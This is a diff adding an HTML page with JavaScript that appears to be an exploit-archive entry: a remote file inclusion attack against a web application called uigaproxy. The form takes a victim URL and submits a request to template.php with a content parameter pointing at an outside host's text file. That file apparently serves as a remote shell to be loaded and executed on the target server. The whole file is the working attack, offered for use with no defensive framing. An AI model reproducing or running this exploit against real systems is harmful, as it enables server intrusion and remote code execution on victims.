@@ -1,0 +1,56 @@
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=windows-1254&quot;&gt;
+&lt;title&gt;coded by ahmadbady&lt;/title&gt;
+ 
+&lt;script language=&quot;JavaScript&quot;&gt;
+ 
+//===========================================================================
+//( #Topic    : uigaproxy
+//( #Bug type : remote file include
+//( #Advisory :
+//===========================================================================
+//( #Author : ItSecTeam
+//( #Email  : Bug@ITSecTeam.com
+//( #Website: http://www.itsecteam.com
+//( #Forum  : http://forum.ITSecTeam.com
+    
+//---------------------------------------------------------------------
+ 
+ 
+   var path=&quot;/uigaproxy/include/&quot;
+   var file=&quot;template.php&quot;
+   var variable =&quot;?content=&quot;
+   var shell=&quot;http://ahmadbady.persiangig.com/other/a.txt?&quot;
+ 
+   function it(){
+  xpl.action= document.xpl.victim.value+path+file+variable+shell;xpl.submit();
+   }
+&lt;/script&gt;
+ 
+&lt;/head&gt;
+ 
+&lt;body bgcolor=&quot;#FFFFFF&quot;&gt;
+ 
+&lt;p align=&quot;left&quot;&gt;&lt;font color=&quot;#0000FF&quot;&gt;&lt;b&gt;uigaproxy remote file include&lt;/b&gt;&lt;/font&gt;&lt;/p&gt;
+&lt;form method=&quot;post&quot; name=&quot;xpl&quot; onSubmit=&quot;it();&quot;&gt;
+    &lt;p align=&quot;left&quot;&gt;
+    &lt;b&gt;&lt;font face=&quot;Tahoma&quot; size=&quot;2&quot;&gt;&lt;font color=&quot;#FF0000&quot;&gt;example&lt;/font&gt;:http://victim/path&lt;/a&gt;&lt;/font&gt;
+    or
+    &lt;/font&gt;
+    &lt;font face=&quot;Tahoma&quot; size=&quot;2&quot; color=&quot;#000000&quot;&gt;http://victim&lt;/font&gt;&lt;font
+size=&quot;2&quot; face=&quot;Tahoma&quot;&gt;&lt;/a&gt; &lt;font size=&quot;2&quot;&gt; --&gt;&lt;/font&gt;&lt;/font&gt;&lt;/b&gt;&lt;font
+size=&quot;2&quot; face=&quot;Tahoma&quot;&gt;
+    &lt;input type=&quot;text&quot; name=&quot;victim&quot; size=&quot;20&quot;;&quot;&gt;&lt;/p&gt;
+&lt;center&gt;
+ 
+&lt;/p&gt;
+  &lt;p&gt;&lt;input type=&quot;submit&quot; value=&quot;GO&quot; name=&quot;B1&quot; style=&quot;float: left&quot;&gt;&lt;input type=&quot;reset&quot;
+value=&quot;reset&quot; name=&quot;B2&quot; style=&quot;float: left&quot;&gt;&lt;/p&gt;
+&lt;/form&gt;
+&lt;p&gt;&lt;br&gt;
+ &lt;/p&gt;
+&lt;/center&gt;
+&lt;/body&gt;
+ 
+&lt;/html&gt;
